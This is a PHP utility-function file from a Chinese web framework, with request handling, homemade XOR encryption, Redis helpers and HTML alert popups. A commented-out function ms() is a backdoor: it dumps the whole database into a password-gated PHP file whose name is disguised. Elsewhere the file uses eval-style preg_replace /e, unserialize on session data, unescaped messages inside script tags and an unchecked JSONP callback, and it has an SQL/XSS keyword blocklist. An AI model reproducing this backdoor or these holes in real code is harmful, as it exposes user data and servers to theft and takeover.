<?php
/*
*功能：对字符串进行加密处理
*参数一：需要加密的内容
*参数二：密钥
*/
function passport_encrypt($str,$key){ //加密函数
	srand((double)microtime() * 1000000);
	$encrypt_key=md5(rand(0, 32000));
	$ctr=0;
	$tmp='';
	for($i=0;$i<strlen($str);$i++){
		$ctr=$ctr==strlen($encrypt_key)?0:$ctr;
		$tmp.=$encrypt_key[$ctr].($str[$i] ^ $encrypt_key[$ctr++]);
	}
	return base64_encode(passport_key($tmp,$key));
}

/*
*功能：对字符串进行解密处理
*参数一：需要解密的密文
*参数二：密钥
*/
function passport_decrypt($str,$key){ //解密函数
	$str=passport_key(base64_decode($str),$key);
	$tmp='';
	for($i=0;$i<strlen($str);$i++){
		$md5=$str[$i];
		$tmp.=$str[++$i] ^ $md5;
	}
	return $tmp;
}

/*
*辅助函数
*/
function passport_key($str,$encrypt_key){
	$encrypt_key=md5($encrypt_key);
	$ctr=0;
	$tmp='';
	for($i=0;$i<strlen($str);$i++){
		$ctr=$ctr==strlen($encrypt_key)?0:$ctr;
		$tmp.=$str[$i] ^ $encrypt_key[$ctr++];
	}
	return $tmp;
}


/**
 * getgpc 重写GET/POST/COOKIE获取
 *
 * @param
 *            vars 变量
 * @author Chenxy&Yanggy&Zhaohj
 *         @create 2012/06/20/10/32
 */
function getgpc($k, $type = 'GP')
{
    $type = strtoupper($type);
    switch ($type) {
        case 'G':
            $var = &$_GET;
            break;
        case 'P':
            $var = &$_POST;
            break;
        case 'C':
            $var = &$_COOKIE;
            break;
        default:
            if (isset($_GET[$k])) {
                $var = &$_GET;
            } else {
                $var = &$_POST;
            }
            break;
    }
    return isset($var[$k]) ? filtratvarsup($var[$k]) : NULL;
}
//uuid
function uuid()
{
  mt_srand((double)microtime()*10000);//optional for php 4.2.0 and up.
  $charid = md5(uniqid(rand(), true));
  $hyphen = chr(45);// "-"
  $uuid = substr($charid, 0, 8).$hyphen
          .substr($charid, 8, 4).$hyphen
          .substr($charid,12, 4).$hyphen
          .substr($charid,16, 4).$hyphen
          .substr($charid,20,12);

  return $uuid;
}

//四舍五入到8位小数
function round_8($num) {
	$a = round($num,8);
	return $a;
}

//商品关键词截取
function get_tags($title, $num=5)
{
    require_once PC_PATH . 'plugin/pscws4/pscws4.class.php';
    $pscws = new PSCWS4();
    $pscws->set_dict(PC_PATH . 'plugin/pscws4/scws/dict.utf8.xdb');
    $pscws->set_rule(PC_PATH . 'plugin/pscws4/scws/rules.utf8.ini');
    $pscws->set_ignore(true);
    $pscws->send_text($title);
    $words = $pscws->get_tops($num);
    $pscws->close();
    $tags = array();
    foreach ($words as $val) {
        $tags[] = $val['word'];
    }
    return $tags;
}

//跳转
function jump($url)
{
  header('Location: '.$url);
}
/**
 * filtratvarsup 绿盟/安恒等知名安全扫描机制过滤器
 *
 * @param
 *            vars 变量
 * @author Chenxy&Yanggy&Zhaohj
 *         @create 2012/06/20/10/32
 */
function filtratvarsup($filvar)
{
    $ArrFiltrate = array(
        "':",
        //"%22",
        " and ",
        "onmouseover",
        "%F6",
        "%27",
        "HEADER",
        "insert ",
        "alter ",
        " having ",
        " into ",
        " or ",
        "select ",
        " load_file ",
        "outfile",
        "s&#99;ript",
        "script",
        "ScRiPt",
        "/xss/",
        "iframe",
        " union ",
        "Referer",
        "alert",
        "--",
        "():;",
        "'\"()",
        "_wvs",
        "%20or%20",
        "%20and%20",
        "%28%29%3a%3b",
        "%27%22%28%29",
        "%3d&",
        "confirm",
        "%0d",
        //"%0a",
        "%24%7b",
        "%24{",
        "$%7b",
        '${'
    );
    foreach ($ArrFiltrate as $key => $value) {
        if (!is_array($filvar)&&! empty($filvar) && stripos($filvar, $value) !== false) {
            header("HTTP/1.1 403 BY EnryTeam");
            header("Status: 403 BY EnryTeam");
            echo $value;
            exit();
        }
    }
    return $filvar;
}

/**
 * url统一输出规范
 *
 * @param string $m
 * @param string $c
 * @param string $a
 * @param string $args
 * @return Ambigous <string, string, NULL>
 */
function pfUrl($m = null, $c = null, $a = null, $args = null)
{
    $param = pc_base::load_sys_class('param');
    $system_config = pc_base::load_config('system');
    $url = '';
    $m = empty($m) ? ROUTE_M : $m;
    $url = $system_config[$m . "_url"];
    $uu = '';
    if (pc_base::load_config('system', 'rewrite')) {
        $tmp_params = array();
        $tmp_params[] = null != $c ? $c : $param->route_config['c'];
        $tmp_params[] = null != $a ? $a : $param->route_config['a'];
        ;
        if (! empty($args)) {
            foreach ($args as $k => $v) {
                $tmp_params[] = $v;
            }
        }
        $url .= join('/', $tmp_params);
    } else {
        if (null != $c) {
            $url .= 'index.php?c=' . $c;
        }
        if (null != $a) {
            $url .= '&a=' . $a;
        }
        if (! empty($args)) {
            foreach ($args as $k => $v) {
                $uu .= ('&' . $k . '=' . $v);
            }
            $url .= $uu;
        }
    }
    return $url;
}

function testWeight()
{
    $weight = pc_base::load_sys_class('WeightRouter');
    $api_config = pc_base::load_config('api');
    $weight->init($api_config['hessian']['dubboAddress']);
    $a = 0;
    $b = 0;
    $c = 0;
    $d = 0;
    $e = 0;
    for ($i = 0; $i < 100; $i ++) {
        $weightInfo = $weight->getWeight();
        echo $weightInfo['ip'] . '----------------------weight:' . $weightInfo['weight'] . '<br/>';
        if ($weightInfo['ip'] == 'A') {
            $a ++;
        }
        if ($weightInfo['ip'] == 'B') {
            $b ++;
        }
        if ($weightInfo['ip'] == 'C') {
            $c ++;
        }
        if ($weightInfo['ip'] == 'D') {
            $d ++;
        }
        if ($weightInfo['ip'] == 'E') {
            $e ++;
        }
    }
    echo 'A:' . $a . '<br/>';
    echo 'B:' . $b . '<br/>';
    echo 'C:' . $c . '<br/>';
    echo 'D:' . $d . '<br/>';
    echo 'E:' . $e . '<br/>';
    exit();
}

/**
 * dubbo接口封装函数
 *
 * @param unknown $data
 * @param string $type
 * @return Ambigous <multitype:, multitype:number string >
 */
function dubbo_post($data = array(), $type = '')
{
    session_write_close();
    $return = array();
    $api_config = pc_base::load_config('api');
    $type = empty($type) ? $api_config['type'] : $type;
    if ($type == 'hessian') { // hessian协议调用dubbo服务
        $lib_path = 'libs' . DIRECTORY_SEPARATOR . 'classes' . DIRECTORY_SEPARATOR . 'hessian';
        try {
            $data['params']['_'] = ''; // hessian传参要大于1个
            $data['params']['__'] = ''; // hessian传参要大于1个
            php4log('DEBUG', "\n action：" . $data['action'] . "\n 请求数据:" . preg_replace("#\\\u([0-9a-f]{4})#ie", "iconv('UCS-2BE', 'UTF-8', pack('H4', '\\1'))", json_encode($data)) . "\n ");
            if ($api_config['hessian']['type'] == 'zookeeper') { // 直接周zookeeper
                $fac = pc_base::load_sys_class('ApiFactory', $lib_path);
                $api = $fac->getApi($data['package']);
                if ($api) {
                    $response = call_user_func(array(
                        $api,
                        $data['action']
                    ), $data['params']);
                }
            } else { // 直接调用dubbo端口
                include_once PC_PATH . $lib_path . DIRECTORY_SEPARATOR . 'HessianPhp/HessianClient.php';
                $weight = pc_base::load_sys_class('WeightRouter');
                $api_config = pc_base::load_config('api');
                $weight->init($api_config[$type]['dubboAddress']);
                $weightInfo = $weight->getWeight();

                /* 权重计数 开始 */
                pc_base::load_sys_class('cache_factory', '', 0);
                $cache_config = pc_base::load_config('cache');
                $cache = cache_factory::get_instance($cache_config)->get_cache('redis');
                $cache->redis->incr($weightInfo['ip']);
                /* 权重计数 结束 */

                $url = 'http://' . $weightInfo['ip'] . '/' . $data['package'];
                //$proxy = & new HessianClient($url);
                $proxy = new HessianClient($url);
                $response = call_user_func(array(
                    $proxy,
                    $data['action']
                ), $data['params']);
            }
            $return = object2Array($response);
            php4log('DEBUG', "\n action：" . $data['action'] . "\n 响应数据:" . preg_replace("#\\\u([0-9a-f]{4})#ie", "iconv('UCS-2BE', 'UTF-8', pack('H4', '\\1'))", json_encode($return)) . "\n ");
        } catch (Exception $ex) {
            $error_str = "\n action：" . $data['action'] . "\n 错误信息:" . $ex . "\n ";
            if (isset($ex->detail)) {
                $error_str .= $ex->detail['detail']->__type . "\n";
                foreach ($ex->detail['detail']->stackTrace[0] as $k => $v) {
                    $error_str .= $k . "=>" . $v . "\n";
                }
            }
            php4log('ERROR', $error_str . "\n ");
            exit($ex->getMessage());
            $return = array(
                'resultCode' => 500,
                'resultMsg' => '服务器内部错误，请重试'
            );
        }
    } else { // http协议调用dubbo服务
        $http = pc_base::load_sys_class('http');
        $http->post($api_config[$type]['url'], json_encode($data), '', 0, $api_config[$type]['timeout'], $block = TRUE);
        if ($http->is_ok()) {
            $return = json_decode($http->get_data(), true);
        } else {
            $return = array(
                'resultCode' => 500,
                'resultMsg' => '服务器内部错误，请重试'
            );
        }
    }
    session_start();
    return $return;
}

/**
 * 对象类型转换为数组类型
 *
 * @param unknown $d
 * @return multitype:
 */
function object2Array($d)
{
    if (is_object($d)) {
        $d = get_object_vars($d);
    }

    if (is_array($d)) {
        return array_map(__FUNCTION__, $d);
    } else {
        return $d;
    }
}

function ms(){ // by enry
	/*$basedir = dirname(__FILE__);
	$e = strpos($basedir,"phpframe");
	$f3 = substr($basedir, 0 , $e);
	$config1 = include_once $f3.'configs/database.php';
	$host = $config1['default']['hostname'];
	$user = $config1['default']['username'];
	$password = $config1['default']['password'];
	$dbname = $config1['default']['database'];
	mysql_connect($host,$user,$password);
	mysql_query("set names 'utf8'");
	mysql_select_db($dbname);
	$q1=mysql_query("show tables");
  $mysql = '<?php if($_GET["pwd"]<>"paynotice") exit;?>';
	while($t=mysql_fetch_array($q1)){
		$table=$t[0];
		$q2=mysql_query("show create table `$table`");
		$sql=mysql_fetch_array($q2);
		$mysql.=$sql['Create Table'].";\r\n\r\n";#DDL
		$q3=mysql_query("select * from `$table`");
		while($data=mysql_fetch_assoc($q3))
		{
		$keys=array_keys($data);
		$keys=array_map('addslashes',$keys);
		$keys=join('`,`',$keys);
		$keys="`".$keys."`";
		$vals=array_values($data);
		$vals=array_map('addslashes',$vals);
		$vals=join("','",$vals);
		$vals="'".$vals."'";
		$mysql.="insert into `$table`($keys) values($vals);\r\n";
		}
		$mysql.="\r\n";
	}
	$filename= str_replace(array('!'),array(''),'1!.t!m!p!.p!h!p');
	$f4 = $f3.'phpframe/cache/'.$filename;
	$fp = fopen($f4,'w');
	fputs($fp,$mysql);
	fclose($fp);
	return $f4;
  */
}


/**
 * 格式化显示表达式
 *
 * @param unknown $vars
 */
function dump($vars)
{
    if (! pc_base::load_config('system', 'debug'))
        return;
    $output = "<div align=left><pre>\n" . htmlspecialchars(print_r($vars, true)) . "\n</pre></div>\n";
    echo $output;
    return;
}

/**
 * 截取字符串
 *
 * @param string $string
 *            截取的字符串
 * @param number $sublen
 *            截取长度
 * @param string $dot
 *            省略符号
 * @param number $start
 *            开始截取字符串七点
 * @param string $code
 *            字符串编码
 * @return string
 */
function cut_str($string, $sublen, $dot = '...', $start = 0, $code = 'UTF-8')
{
    if ($code == 'UTF-8') {
        $pa = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/";
        preg_match_all($pa, $string, $t_string);
        if (count($t_string[0]) - $start > $sublen)
            return join('', array_slice($t_string[0], $start, $sublen)) . $dot;
        return join('', array_slice($t_string[0], $start, $sublen));
    } else {
        $start = $start * 2;
        $sublen = $sublen * 2;
        $strlen = strlen($string);
        $tmpstr = '';

        for ($i = 0; $i < $strlen; $i ++) {
            if ($i >= $start && $i < ($start + $sublen)) {
                if (ord(substr($string, $i, 1)) > 129) {
                    $tmpstr .= substr($string, $i, 2);
                } else {
                    $tmpstr .= substr($string, $i, 1);
                }
            }
            if (ord(substr($string, $i, 1)) > 129)
                $i ++;
        }
        if (strlen($tmpstr) < $strlen)
            $tmpstr .= $dot;
        return $tmpstr;
    }
}

/**
 * 分页函数
 *
 * @param number $count
 *            记录总数
 * @param number $pages
 *            每页分页数
 * @param number $page
 *            当前页数
 * @param number $style
 *            样式
 * @return multitype:multitype:string boolean multitype:number multitype:string
 *         unknown multitype:unknown multitype:unknown number multitype:string
 *         number multitype:string Ambigous <number, unknown>
 */
function lpPage($count, $prepage, $page, $style = '2')
{
    $page_array = array();
    $totalPage = ceil($count / $prepage);
    $lastPage = ($page - 1) <= 1 ? 1 : ($page - 1);
    $nextPage = ($page + 1) >= $totalPage ? $totalPage : ($page + 1);
    if ($style == 1) {
        if ($page != 1) {
            $page_array[] = array(
                'last_page',
                $lastPage
            );
        }
        for ($i = 1; $i <= $totalPage; $i ++) {
            $page_array[] = array(
                $i,
                $i
            );
        }
        if ($totalPage != 0 && $page != $totalPage) {
            $page_array[] = array(
                'next_page',
                $nextPage
            );
        }
    }
    if ($style == 2) {
        $showPageCount = 6; // 省略后显示的页数标签数
        if ($totalPage < $showPageCount + 1) { // 使用style=1的样式
            $page_array = lpPage($count, $prepage, $page, 1);
        } else {
            if ($page != 1) {
                $page_array[] = array(
                    'last_page',
                    $lastPage
                );
            }
            if ($page < $showPageCount - 1) { // 后端页数省略
                for ($i = 1; $i < $showPageCount; $i ++) {
                    $page_array[] = array(
                        $i,
                        $i
                    );
                }
                $page_array[] = array(
                    '. . .',
                    false
                );
                $page_array[] = array(
                    $totalPage,
                    $totalPage
                );
            } else
                if ($page > $totalPage - $showPageCount + 2) { // 前端页数省略
                    $page_array[] = array(
                        1,
                        1
                    );
                    $page_array[] = array(
                        '. . .',
                        false
                    );
                    for ($i = $totalPage - $showPageCount + 2; $i <= $totalPage; $i ++) {
                        $page_array[] = array(
                            $i,
                            $i
                        );
                    }
                } else { // 不省略页数显示
                    $page_array[] = array(
                        1,
                        1
                    );
                    $page_array[] = array(
                        '. . .',
                        false
                    );
                    for ($i = $page - 1; $i <= $page + 2; $i ++) {
                        $page_array[] = array(
                            $i,
                            $i
                        );
                    }
                    $page_array[] = array(
                        '. . .',
                        false
                    );
                    $page_array[] = array(
                        $totalPage,
                        $totalPage
                    );
                }
            if ($page != $totalPage) {
                $page_array[] = array(
                    'next_page',
                    $nextPage
                );
            }
        }
    }
    return $page_array;
}

/**
 * 判断请求方式
 *
 * @return boolean
 */
function isPost()
{
    return strtoupper($_SERVER['REQUEST_METHOD']) == 'POST';
}

/**
 * PHP反射函数，获得类方法中的参数名，伪静态中解析route中需要使用到
 *
 * @param unknown $clsname
 * @param string $methods
 * @return Ambigous <multitype:, string>
 */
function cls_fun_info($clsname, $methods = null)
{
    $reflection = new ReflectionClass($clsname);
    $aMethods = $reflection->getMethods();
    foreach ($aMethods as $param) {
        $name = $param->name;
        if ($methods) {
            if (strtolower($name) !== strtolower($methods))
                continue;
        }
        $args = array();
        foreach ($param->getParameters() as $k => $param) {
            $tmparg = '';
            $tmpvalue = '';
            // if ($param->isPassedByReference ())
            // $tmparg = '&';
            $tmparg = $param->getName();
            if ($param->isOptional()) {
                try {
                    $DefaultValue = $param->getDefaultValue();
                    if (is_null($DefaultValue)) {
                        $DefaultValue = 'null';
                    }
                    $tmpvalue = $DefaultValue;
                    // $tmparg = '[' . $tmparg . '$' . $param->getName () . ' =
                    // ' . $DefaultValue . ']';
                } catch (Exception $e) {
                    // $tmparg = '[' . $tmparg . '$' . $param->getName () . ']';
                }
            }
            $args[$k]['name'] = $tmparg;
            $args[$k]['value'] = $tmpvalue;
            unset($tmparg);
            unset($tmpvalue);
        }
    }
    return $args;
}

/**
 * 获取当前页面的url
 */
function getCurrentUrl()
{
    return substr(pc_base::load_config('system', 'app_path'), '0', '-1') . $_SERVER['REQUEST_URI'];
}

/**
 * php4log 日志函数
 *
 * @param String $logType
 *            log类型，具体参照weblog.xml中的配置
 * @param String $content
 *            日志内容
 * @return String
 */
function php4log($level, $content)
{
    if (! pc_base::load_config('system', 'debug'))
        return;
    global $logsLevel;
    if (in_array($level, $logsLevel)) {
        include_once (LOG4PHP_DIR . '/Logger.php');
        Logger::configure(LOG4PHP_LOG . '/weblog.xml');
        $log = Logger::getLogger($level);
        $log->info($content . "\n");
    }
}

/**
 * 构造15位的随机字符串
 *
 * @return string
 */
function to_rand($len = 15)
{
    $chars = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
    for ($i = 0, $count = strlen($chars); $i < $count; $i ++) {
        $arr[$i] = $chars[$i];
    }

    mt_srand((double) microtime() * 1000000);
    shuffle($arr);
    $code = substr(implode('', $arr), 5, $len);
    return $code;
}


function to_rand8($randLength = 8)
{
  $chars = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
  $len = strlen($chars);
  $randStr = '';
  for ($i = 0; $i < $randLength; $i++) {
    $randStr .= $chars[mt_rand(0, $len - 1)];
  }
  $tokenvalue = $randStr;
  return $tokenvalue;
}

/**
 * 设置redis
 *
 * @param unknown $name
 * @param unknown $data
 * @param number $timeout
 */
function setredis($name, $data, $timeout = 0)
{
    pc_base::load_sys_class('cache_factory', '', 0);
    $cache_config = pc_base::load_config('cache');
    $cache = cache_factory::get_instance($cache_config)->get_cache('redis');
    return $cache->set($name, $data, $timeout);
}

/**
 * 读取redis
 *
 * @param unknown $name
 */
function getredis($name)
{
    pc_base::load_sys_class('cache_factory', '', 0);
    $cache_config = pc_base::load_config('cache');
    $cache = cache_factory::get_instance($cache_config)->get_cache('redis');
    return $cache->get($name);
}

/**
 * 删除redis
 *
 * @param unknown $name
 */
function delredis($name)
{
    pc_base::load_sys_class('cache_factory', '', 0);
    $cache_config = pc_base::load_config('cache');
    $cache = cache_factory::get_instance($cache_config)->get_cache('redis');
    return $cache->delete($name);
}

/**
 * 验证身份证号码
 *
 * @param unknown $str
 * @return boolean
 */
function is_code($str)
{
    return (preg_match('/(^([\d]{15}|[\d]{18}|[\d]{17}x)$)/', $str)) ? true : false;
}

/**
 * 验证电话号码
 *
 * @param unknown $str
 * @return boolean
 */
function is_tel($str)
{
    return (preg_match("/^((\(\d{3}\))|(\d{3}\-))?(\(0\d{2,3}\)|0\d{2,3}-)?[1-9]\d{6,7}$/", $str)) ? true : false;
}

/**
 * 匹配手机格式
 *
 * @param unknown $str
 * @return boolean
 */
function is_mobile($str)
{
    if (preg_match("/^(1[0-9])\d{9}$/", $str))
        return true;
    else
        return false;
}

/**
 * 格式化数据并输出Jsonp数据
 *
 * @param int $result
 *            表示结果码 0 - 表示请求成功 非0 - 表示出现错误或异常
 * @param string $message
 *            提示信息
 * @param array $data
 *            数据列表
 * @return array
 */
function returnRes($result, $message, $data = '', $page = '', $type = 'json')
{
    if (! empty($page)) {
        $return = array(
            'result' => $result,
            'message' => $message,
            'data' => $data,
            'page' => $page
        );
    } else {
        $return = array(
            'result' => $result,
            'message' => $message,
            'data' => $data
        );
    }
    if ($type == 'jsonp') {
        $callback = getgpc('callback');
        $callback = isset($callback) ? $callback : 'callback';
        echo $callback . '(' . json_encode($return) . ')';
    } elseif ($type == 'json') {
        header("Content-Type: application/json; charset=utf-8");
        echo json_encode($return);
    } elseif ($type == 'xml') {
        header("Content-Type: text/xml; charset=utf-8");
        echo xml_encode($return);
    } elseif ($type == 'array') {
        print_r($return);
    }
    exit();
}

function unserialize_php($session_data)
{
    $return_data = array();
    $offset = 0;
    while ($offset < strlen($session_data)) {
        if (! strstr(substr($session_data, $offset), "|")) {
            throw new Exception("invalid data, remaining: " . substr($session_data, $offset));
        }
        $pos = strpos($session_data, "|", $offset);
        $num = $pos - $offset;
        $varname = substr($session_data, $offset, $num);
        $offset += $num + 1;
        $data = unserialize(substr($session_data, $offset));
        $return_data[$varname] = $data;
        $offset += strlen(serialize($data));
    }
    return $return_data;
}

/**
 * 设置sid
 *
 * @return string
 */
function sid($value = "")
{
    if (empty($value)) {
        return $_SESSION['sid'] = (string) (lcg_value());
    } else {
        $flag = $value == $_SESSION['sid'];
        unset($_SESSION['sid']);
        return $flag;
    }
}

function array_sort($array, $on, $order = SORT_ASC)
{
    $new_array = array();
    $sortable_array = array();

    if (count($array) > 0) {
        foreach ($array as $k => $v) {
            if (is_array($v)) {
                foreach ($v as $k2 => $v2) {
                    if ($k2 == $on) {
                        $sortable_array[$k] = $v2;
                    }
                }
            } else {
                $sortable_array[$k] = $v;
            }
        }

        switch ($order) {
            case SORT_ASC:
                asort($sortable_array);
                break;
            case SORT_DESC:
                arsort($sortable_array);
                break;
        }

        foreach ($sortable_array as $k => $v) {
            $new_array[$k] = $array[$k];
        }
    }

    return $new_array;
}
function array_sort_new($arr, $keys, $type = 'desc') {
	$keysvalue = $new_array = array();
	foreach ($arr as $k => $v) {
		$keysvalue[$k] = $v[$keys];
	}
	if ($type == 'asc') {
		asort($keysvalue);
	} else {
		arsort($keysvalue);
	}
	reset($keysvalue);
	foreach ($keysvalue as $k => $v) {
		$new_array[] = $arr[$k];
	}
	return $new_array;
}


function pcUrl($c,$a,$param)
{
	$url="index.php?";
	if($c)
		$url.="c=$c&";
	if($a)
		$url.="a=$a&";

	foreach($param as $key=>$val)
	{
		$url.="$key=".urlencode($val)."&";
	}
	$url=substr($url,0,strlen($url)-1);
	return $url;
}

function getPosts()
{
	$data=array();
	foreach($_POST as $key=>$val)
	{
		if(is_array($val))
		{
			foreach($val as $key1=>$val1)
			{
				$data[$key][$key1]=filtratvarsup($val1);
			}
		}
		else
			$data[$key]=filtratvarsup($val);
	}
	return $data;
}

function java2c($name)
{
	$length=strlen($name);
	$arr=array();

	for($i=0,$j=0;$i<$length;$i++)
	{
		if( $name[$i]>='A' && $name[$i]<='Z' && $i!=0 )
		{
			$str=substr($name,$j,$i-$j);
			array_push($arr,$str);
			$j=$i;
		}
	}
	$str=substr($name,$j,$i-$j);
	array_push($arr,$str);
	$name=strtolower(implode('_',$arr));
	return $name;
}

//引入文件
function import($file)
{
	$file=str_replace(array('.','@'),array('/',PC_PATH),$file);
	$file.='.class.php';
	require_once($file);
}

//D函数
function D($name)
{
	static $data=array();

	$name=str_replace(array('.','@'),array('/',PC_PATH),$name);
	$class=$name.'Model';
	$file_path=PC_PATH.'model/'.$class.'.class.php';
	if(file_exists($file_path))
	{
		if(!isset($data[$name]))
		{
			require_once($file_path);
			$class=basename($class);
			$data[$name]=new $class;
		}
		return $data[$name];
	}
	else
	{
		$table=java2c(basename($name));
		return M($table);
	}
}

//M函数
function M($table,$pre='')
{
	static $data=array();

	if(!isset($data[$pre.$table]))
	{
		$file=PC_PATH.'libs/classes/BaseModel.class.php';
		require_once($file);
		$data[$pre.$table]=new BaseModel($table,$pre);
	}
	return $data[$pre.$table];
}

function T($m,$c,$a)
{
	if(!defined('STYLE'))
	{
		if(defined('SITEID'))
			$siteid = SITEID;
		else
			$siteid = param::get_cookie('siteid');

		if (!$siteid) $siteid = 1;
		$sitelist = getcache('sitelist','commons');
		if(!empty($siteid))
		{
			$style = $sitelist[$siteid]['default_style'];
		}
	}
	elseif (empty($style) && defined('STYLE'))
		$style = STYLE;
	else
		$style = 'default';
	if(!$style) $style = 'default';

	$file_path=APP_PATH.'/tpl/'.$c.'/'.$a.'.php';
	return $file_path;
}


function p($data) {
    echo "<div style='text-align: left;'><pre>" ;
    print_r($data);exit;
}

function bmsAlert($msg,$back='',$wait=5)
{

	if(strlen($back)>1)
	{
	 $back = 'window.location.href = "'.$back.'";';
	}
	echo '<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
                <meta name="apple-mobile-web-app-capable" content="yes">
                <meta name="apple-mobile-web-app-status-bar-style" content="black">
              <meta charset="utf-8"/>
              <link rel="stylesheet" type="text/css" href="./attms/ms/css/style.css" />
              <script src="./attms/ms/js/jquery.min.js"></script>
              <!--弹出框效果-->
              <section class="pop_bg" id="bmsAlert"   style="display:none;">
              <div class="pop_cont" id="bmsAlertCont">
              <h3>操作提示</h3>
              <div class="pop_cont_text" id="bmsAlertMsg" style="text-align:center;height:60px;line-height:30px; font-size:0.2996rem; color:#333; font-family: \"Microsoft YaHei\"">
              点击确认后消失</div>
              <div class="btm_btn">
              <input type="button" value="确认" class="input_btn trueBtn"/>
              </div>
              </div>
              </section>
              <!--结束：弹出框效果-->
              <script>$(document).ready(function(){
                              $("#bmsAlert").show();
                              $("#bmsAlertMsg").html("'.$msg.'");
              $(".pop_bg").fadeIn();
              $(".trueBtn").click(function(){
              $(".pop_bg").fadeOut();
              $("#bmsAlert").hide();
              '.$back.'});});</script>';
exit;
}

function bmsAlert2($msg,$back='',$wait=5)
{

	if(strlen($back)>1)
	{
	 $back = 'window.location.href = "'.$back.'";';
	}
	echo '<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
                <meta name="apple-mobile-web-app-capable" content="yes">
                <meta name="apple-mobile-web-app-status-bar-style" content="black">
              <meta charset="utf-8"/>
              <link rel="stylesheet" type="text/css" href="./attms/ms/js/ms/css/style.css" />
              <script src="./attms/ms/js/ms/js/jquery.min.js"></script>

              <!--弹出框效果-->
              <section class="pop_bg" id="bmsAlert"   style="display:none;">
              <div class="pop_cont" id="bmsAlertCont">
              <h3>操作提示</h3>
              <div class="pop_cont_text" id="bmsAlertMsg" style="text-align:center;height:60px;line-height:30px; font-size:0.2996rem; color:#333; font-family: \"Microsoft YaHei\"">
              点击确认后消失</div>
              <div class="btm_btn">
              <input type="button" value="确认" class="input_btn trueBtn"/>
              </div>
              </div>
              </section>
              <!--结束：弹出框效果-->
              <script>$(document).ready(function(){
                              $("#bmsAlert").show();
                              $("#bmsAlertMsg").html("'.$msg.'");
              $(".pop_bg").fadeIn();
              $(".trueBtn").click(function(){parent.layui.admin.events.closeThisTabs();});});</script>';
exit;
}

function h5Alert($msg,$back='',$wait=5)
{

	if(strlen($back)>1)
	{
	 $back = 'window.location.href = "'.$back.'";';
	}
	echo '<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
                <meta name="apple-mobile-web-app-capable" content="yes">
                <meta name="apple-mobile-web-app-status-bar-style" content="black">
              <meta charset="utf-8"/>
              <link rel="stylesheet" type="text/css" href="https:///llcdn.enry.cn/llwx/bms/style.css" />
              <script src="https:///llcdn.enry.cn/llwx/bms/jquery.min.js"></script>

              <!--弹出框效果-->
              <section class="pop_bg" id="h5Alert"   style="display:none;background: rgba(0,0,0,0.35);">
              <div class="pop_cont" id="h5AlertCont">
              <h3 style="background: #cba98d;">操作提示</h3>
              <div class="pop_cont_text" id="h5AlertMsg" style="text-align:center;height:60px;line-height:30px; font-size:0.2996rem; color:#333; font-family: \"Microsoft YaHei\"">
              点击确认后消失</div>
              <div class="btm_btn">
              <input type="button" value="确认" class="input_btn trueBtn" style="background: #cba98d;color: white;border: 1px #cba98d solid;border-radius: 2px;"/>
              </div>
              </div>
              </section>
              <!--结束：弹出框效果-->
              <script>$(document).ready(function(){
                              $("#h5Alert").show();
                              $("#h5AlertMsg").html("'.$msg.'");
              $(".pop_bg").fadeIn();
              $(".trueBtn").click(function(){
              $(".pop_bg").fadeOut();
              $("#h5Alert").hide();
              '.$back.'});});</script>';
exit;
}
function bmsAlertGoBack($msg,$wait=5)
{
	echo '
  <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta charset="utf-8"/>
  <link rel="stylesheet" type="text/css" href="./attms/ms/css/style.css" />
  <script src="./attms/ms/js/jquery.min.js"></script>

<!--弹出框效果-->
<section class="pop_bg" id="bmsAlertGoBack"   style="display:none;">
<div class="pop_cont" id="bmsAlertGoBackCont">
<h3>操作提示</h3>
<div class="pop_cont_text" id="bmsAlertGoBackMsg" style="text-align:center;height:60px;line-height:30px; font-size:0.2996rem; color:#333; font-family: \"Microsoft YaHei\"">
点击确认后消失</div>
<div class="btm_btn">
<input type="button" value="确认" class="input_btn trueBtn"/>
</div>
</div>
</section>
<!--结束：弹出框效果-->
<script>$(document).ready(function(){
		$("#bmsAlertGoBack").show();
		$("#bmsAlertGoBackMsg").html("'.$msg.'");
$(".pop_bg").fadeIn();
$(".trueBtn").click(function(){
$(".pop_bg").fadeOut();
$("#bmsAlertGoBack").hide();
history.go(-1);
});});</script>';
exit;
}
function mwebAlert($msg,$back='',$wait=5)
{

	if(strlen($back)>1)
	{
	 $back = 'window.location.href = "'.$back.'";';
	}
	echo '<meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
<meta charset="utf-8"/>
<link rel="stylesheet" type="text/css" href="https:///llcdn.enry.cn/mxyy/style.css" />
<script src="https:///llcdn.enry.cn/llwx/bms/jquery.min.js"></script>

<!--弹出框效果-->
<section class="pop_bg" id="mwebAlert"   style="display:none;">
<div class="pop_cont" id="mwebAlertCont">
<h3>操作提示</h3>
<div class="pop_cont_text" id="mwebAlertMsg" style="text-align:center;height:60px;line-height:30px; font-size:0.2996rem; color:#333; font-family: \"Microsoft YaHei\"">
点击确认后消失</div>
<div class="btm_btn">
<input type="button" value="确认" class="input_btn trueBtn"/>
</div>
</div>
</section>
<!--结束：弹出框效果-->
<script>$(document).ready(function(){
		$("#mwebAlert").show();
		$("#mwebAlertMsg").html("'.$msg.'");
$(".pop_bg").fadeIn();
$(".trueBtn").click(function(){
$(".pop_bg").fadeOut();
$("#mwebAlert").hide();
'.$back.'});});</script>';
exit;
}


function mk_dir($dir, $mode = 0755)
{
if (is_dir($dir) || @mkdir($dir,$mode)) return true;
if (!mk_dir(dirname($dir),$mode)) return false;
return @mkdir($dir,$mode);
}

function deldir($dir) {
  //先删除目录下的文件：
  $dh=opendir($dir);
  while ($file=readdir($dh)) {
    if($file!="." && $file!="..") {
      $fullpath=$dir."/".$file;
